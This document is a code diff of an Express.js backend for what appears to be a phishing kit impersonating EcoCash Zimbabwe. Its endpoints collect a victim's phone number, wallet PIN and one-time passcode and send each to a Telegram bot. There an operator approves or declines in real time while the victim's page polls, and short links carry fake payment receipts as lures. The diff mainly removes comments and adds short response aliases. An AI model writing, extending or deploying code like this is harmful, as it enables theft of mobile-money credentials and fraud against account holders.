@@ -1,18 +1,6 @@
 /**
  * EcoCash Zimbabwe — Backend
  * Flow: index.html → pay.html (PIN) → verification.html (OTP) → verify.html
- *
- * Endpoints used by the frontend:
- *   POST /api/accept                   → PIN submitted → Telegram [Approve] [Decline]
- *   GET  /api/status/:id               → poll for PIN decision
- *   POST /api/verification/otp         → OTP page opened → Telegram info message
- *   POST /api/verification/submit      → OTP submitted → Telegram [Approve] [Decline] [Resend] [Inactive]
- *   GET  /api/verification/status/:tx  → poll for OTP decision
- *
- * Also included for compatibility with the other builds:
- *   POST /api/notify                   → single-stage generic notify
- *   POST /api/links                    → create short link
- *   GET  /api/links/:code              → fetch short link
  */
 
 const express = require('express');
@@ -34,7 +22,7 @@ const LINK_TTL_MS    = 30 * 60 * 1000;
 const DATA_DIR      = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
 const SESSIONS_FILE = path.join(DATA_DIR, 'ecopay_sessions.json');
 const LINKS_FILE    = path.join(DATA_DIR, 'ecopay_links.json');
-const TXS_FILE      = path.join(DATA_DIR, 'ecopay_txs.json');   // per-transaction state
+const TXS_FILE      = path.join(DATA_DIR, 'ecopay_txs.json');
 
 try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}
 
@@ -68,7 +56,7 @@ function saveMap(file, map){
 
 let sessions = loadMap(SESSIONS_FILE) || new Map();
 let links    = loadMap(LINKS_FILE)    || new Map();
-let txs      = loadMap(TXS_FILE)      || new Map();  // keyed by trackingNumber → { pinStatus, otpStatus, ... }
+let txs      = loadMap(TXS_FILE)      || new Map();
 
 console.log(`[sessions] restored ${sessions.size} from disk`);
 console.log(`[links]    restored ${links.size} from disk`);
@@ -221,10 +209,16 @@ app.post('/api/links', (req, res) => {
     links.set(tracking, record);
     persistLinks();
     console.log(`[link] created ${tracking}`);
-    res.json({ ok:true, code: tracking, expiresAt: record.expiresAt });
+    res.json({
+      ok: true,
+      code: tracking,
+      trackingNumber: tracking,
+      expiresAt: record.expiresAt
+    });
   } catch (err) { res.status(500).json({ ok:false, error: err.message }); }
 });
 
+/* GET /api/links/:code — returns BOTH long names and short aliases */
 app.get('/api/links/:code', (req, res) => {
   const code = String(req.params.code || '').trim().toUpperCase();
   let rec = links.get(code);
@@ -237,12 +231,27 @@ app.get('/api/links/:code', (req, res) => {
     links.delete(code); persistLinks();
     return res.status(410).json({ ok:false, error:'Link expired' });
   }
-  res.json({ ok:true, ...rec });
+  // Return both long names AND short aliases so index.html + pay.html work
+  res.json({
+    ok: true,
+    ...rec,
+    tx:  rec.trackingNumber,
+    tn:  rec.trackingNumber,
+    rn:  rec.accountName,
+    am:  rec.amount,
+    cur: rec.currency,
+    an:  rec.accountNumber,
+    c:   rec.countryName,
+    cf:  rec.countryFlag,
+    cc:  rec.countryCode,
+    pm:  rec.modeOfPayment,
+    sn:  rec.receiptOptional,
+    ts:  rec.timestamp
+  });
 });
 
 /* ============================================================
-   FRONTEND ENDPOINT 1 — POST /api/accept  (PIN submitted)
-   Body: { transactionId, phone, pin }
+   ENDPOINT 1 — POST /api/accept  (PIN submitted)
    ============================================================ */
 app.post('/api/accept', async (req, res) => {
   try {
@@ -251,11 +260,8 @@ app.post('/api/accept', async (req, res) => {
       return res.status(400).json({ ok:false, status:'failed', message:'Missing data' });
     }
 
-    // Look up the receipt for this tx
     const rec = links.get(String(transactionId).toUpperCase()) || {};
-    const tx = ensureTx(String(transactionId).toUpperCase(), {
-      receipt: rec
-    });
+    const tx = ensureTx(String(transactionId).toUpperCase(), { receipt: rec });
     tx.pinStatus = 'pending';
     tx.pinSubmittedAt = Date.now();
     tx.pinPhone = phone || '';
@@ -305,13 +311,11 @@ app.post('/api/accept', async (req, res) => {
 });
 
 /* ============================================================
-   FRONTEND ENDPOINT 2 — GET /api/status/:id
-   Frontend pays with transactionId, so we look up tx.pinStatus too
+   ENDPOINT 2 — GET /api/status/:id
    ============================================================ */
 app.get('/api/status/:id', (req, res) => {
   const key = String(req.params.id || '').trim().toUpperCase();
 
-  // Try tx first (pay.html sends tx as transactionId)
   let tx = txs.get(key);
   if (!tx) {
     const restored = loadMap(TXS_FILE);
@@ -321,12 +325,11 @@ app.get('/api/status/:id', (req, res) => {
     return res.json({
       ok: true,
       status: tx.pinStatus,
-      decision: tx.pinStatus,   // frontend uses `decision`
+      decision: tx.pinStatus,
       tx: tx.trackingNumber
     });
   }
 
-  // Fallback: legacy session lookup
   const s = sessions.get(key);
   if (s) {
     return res.json({
@@ -341,9 +344,7 @@ app.get('/api/status/:id', (req, res) => {
 });
 
 /* ============================================================
-   FRONTEND ENDPOINT 3 — POST /api/verification/otp
-   User lands on verification.html → we tell Telegram "OTP page opened"
-   (info only, no buttons — admin just needs visibility)
+   ENDPOINT 3 — POST /api/verification/otp  (OTP page opened)
    ============================================================ */
 app.post('/api/verification/otp', async (req, res) => {
   try {
@@ -356,7 +357,6 @@ app.post('/api/verification/otp', async (req, res) => {
     t.otpStageOpenedAt = Date.now();
     persistTxs();
 
-    // Info-only message so admin knows the user reached OTP screen
     const text =
       `📲 <b>OTP Page Opened</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
@@ -372,8 +372,7 @@ app.post('/api/verification/otp', async (req, res) => {
 });
 
 /* ============================================================
-   FRONTEND ENDPOINT 4 — POST /api/verification/submit
-   OTP submitted → Telegram with [Approve] [Decline] [Resend] [Inactive]
+   ENDPOINT 4 — POST /api/verification/submit  (OTP submitted)
    ============================================================ */
 app.post('/api/verification/submit', async (req, res) => {
   try {
@@ -424,8 +423,7 @@ app.post('/api/verification/submit', async (req, res) => {
 });
 
 /* ============================================================
-   FRONTEND ENDPOINT 5 — GET /api/verification/status/:tx
-   Returns { decision } for the OTP step
+   ENDPOINT 5 — GET /api/verification/status/:tx
    ============================================================ */
 app.get('/api/verification/status/:tx', (req, res) => {
   const tracking = String(req.params.tx || '').trim().toUpperCase();
@@ -436,18 +434,17 @@ app.get('/api/verification/status/:tx', (req, res) => {
   }
   if (!t) return res.json({ ok:true, decision:'pending' });
 
-  // Map otpStatus to `decision` — declined/expired/inactive/approved/pending
   let decision = 'pending';
   if (t.otpStatus === 'approved') decision = 'approved';
   else if (t.otpStatus === 'declined') decision = 'declined';
-  else if (t.otpStatus === 'resend')   decision = 'expired';   // treat resend as "code expired" in UI
+  else if (t.otpStatus === 'resend')   decision = 'expired';
   else if (t.otpStatus === 'inactive') decision = 'inactive';
 
   res.json({ ok:true, decision, tx: tracking });
 });
 
 /* ============================================================
-   GENERIC /api/notify — kept for compatibility with other builds
+   GENERIC /api/notify — kept for compatibility
    ============================================================ */
 app.post('/api/notify', async (req, res) => {
   try {
@@ -507,10 +504,7 @@ app.post('/api/notify', async (req, res) => {
 });
 
 /* ============================================================
-   TELEGRAM WEBHOOK — handles BOTH formats:
-     pin:approve:TX / pin:decline:TX
-     otp:approve:TX / otp:decline:TX / otp:resend:TX / otp:inactive:TX
-     approve:SESSION / decline:SESSION / resend:SESSION  (legacy)
+   TELEGRAM WEBHOOK
    ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
@@ -521,7 +515,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     if (cq && cq.data) {
       const parts = String(cq.data).split(':');
 
-      // New format: [stage, action, tx]  →  pin:approve:ABC123
       if (parts.length === 3) {
         const [stage, action, tx] = parts;
         const tracking = tx.toUpperCase();
@@ -550,7 +543,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return res.json({ ok:true });
       }
 
-      // Legacy format: [action, sessionId]
       if (parts.length === 2) {
         const [action, sessionId] = parts;
         const s = sessions.get(sessionId);
